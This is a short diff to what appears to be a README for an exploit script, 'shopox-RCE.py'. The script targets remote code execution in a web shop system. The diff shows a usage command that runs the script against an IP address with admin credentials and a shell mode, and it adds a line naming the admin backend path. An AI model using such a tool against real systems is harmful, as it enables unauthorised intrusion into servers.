@@ -10,3 +10,6 @@ How to Use the Script
 ```
 python shopox-RCE.py -u http://192.168.6.211 --admin-entry adminykccts.php -a admin -p 123456 --mode shell
 ```
+adminykccts.php is the path to the administrator backend.
+
+![](./1.png)
